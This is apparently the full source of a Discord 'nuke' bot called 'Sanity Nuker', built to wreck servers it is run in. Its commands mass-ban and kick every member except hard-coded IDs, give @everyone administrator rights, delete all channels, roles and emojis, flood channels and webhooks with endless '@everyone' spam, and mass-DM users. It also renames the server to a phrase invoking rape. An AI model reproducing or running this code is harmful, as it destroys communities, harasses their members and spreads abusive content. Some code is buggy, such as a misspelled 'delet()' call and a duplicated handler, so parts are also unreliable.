import discord
import asyncio
import colorama 
import json
from discord.ext import commands
import os
import random 
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions




sanity = commands.Bot(command_prefix=".", intents = discord.Intents.all())



token = "bot token goes here"


CHANNEL_NAMES = ['channel-name', 'channel-name', 'channel-name', 'channel-name']
MESSAGE_CONTENTS = ['@everyone rip bozo', '@everyone rip bozo', '@everyone rip bozo']
WEBHOOK_NAMES = ['name', 'name', 'name', 'name', 'name']

sanity.remove_command('help')

@sanity.event
async def on_ready():
  os.system("title" + f"[Nuke Bot] - logged in as {sanity.user}")
  print(f'''

  ██████╗  █████╗ ██████╗ ██╗██╗   ██╗███╗   ███╗
██╔══██╗██╔══██╗██╔══██╗██║██║   ██║████╗ ████║
██████╔╝███████║██║  ██║██║██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║  ██║██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██████╔╝██║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝
''')                                              







@sanity.command()
async def ban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 695070568826929214:
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} Mass-Ban In Progress{ctx.guild.name}")
            except:
                print (f"{user.name}  Was Not Banned  {ctx.guild.name}")
        print ("[-] Mass-Ban Completed")


@sanity.command()
async def dmall(ctx, *, message:str):
  await ctx.message.delete()
  for channel in sanity.private_channels:
    try:
      await channel.send(f"{message}")
      print("Message Sent To {channel}")
    except:
      print("Message Not Sent To {channel}")



@sanity.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("Failed to give everyone admin")



@sanity.event
async def on_ready():
  await sanity.change_presence(activity=discord.Game(name= "Your Demise"))
  print(f''' 

██████╗  █████╗ ██████╗ ██╗██╗   ██╗███╗   ███╗
██╔══██╗██╔══██╗██╔══██╗██║██║   ██║████╗ ████║
██████╔╝███████║██║  ██║██║██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║  ██║██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██████╔╝██║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝     ╚═╝
                                               
''')


@sanity.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@sanity.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@sanity.command()
async def roles(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"")
      print("Created Roles")
    except:
        print("Failed To Create Role")


  
@sanity.command()
async def wizz(ctx, amount=50):
  await ctx.guild.edit(name="Raped By Saiko")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(channel.name + " Has been wizzed")
    except:
        print(channel.name + " Has failed to been wizzed")
        print ("error")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
      print(f"[{i}] channels made")
    except:
      print("error making channels")
  for role in ctx.guild.roles:
    try:
      await role.delet()
      print(f"{role.name} deleted")

    except:
      print(f"{role.name} not deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(MESSAGE_CONTENTS)
        )
          print(f"{channel.name} spammed")
        except:
          print(f"{channel.name} not spammed")
    for member in ctx.guild.members:
      if member.id != 320408390587121664:  
        try:
          await member.ban(reason="Sanity Nuker Wizzed You")
          print(f"{member.name} banned from {ctx.guild.name}")
        except:
          print(f"{member.name} not banned from {ctx.guild.name}")  

        
@sanity.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(MESSAGE_CONTENTS))
    await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))

@sanity.command()
async def spam(ctx):
  for i in range(1000):
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(MESSAGE_CONTENTS))

        print(f"{channel.name} Spammed")
      except:
        print(f"{channel.name} Not Spammed")

@sanity.command()
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Sanity Nuker Wizzed You")
      print(member.name + "Has Been Kicked")
    except:
      print(member.name + "Has Not Been Kicked")

@sanity.command()
async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title="Sanity Nuker", description="Developed by Revibe & Descend", timestamp=ctx.message.created_at, color=0xbf00ff)
  embed.set_author(name="Sanity!", icon_url=ctx.author.avatar_url)

  embed.add_field(name="` Wizz `", value="` Nukes The Server `", Inline=False)
  embed.add_field(name="` Ban `", value="` Bans Everyone `", Inline=False)
  embed.add_field(name="` Admin `", value="` Gives Everyone Admin `", Inline=False)  
  embed.add_field(name="` Spam `", value="` Spams Every Channel `", Inline=False)
  embed.add_field(name="` Emojidel `", value="` Deletes All Server Emojis `", Inline=False)
  embed.add_field(name="` Roles `", value="` Creates All Roles `", Inline=False)  
  embed.add_field(name="` Dmall `", value="` Dms Everyone `", Inline=False)

  await ctx.send(embed=embed)


sanity.run(token) 
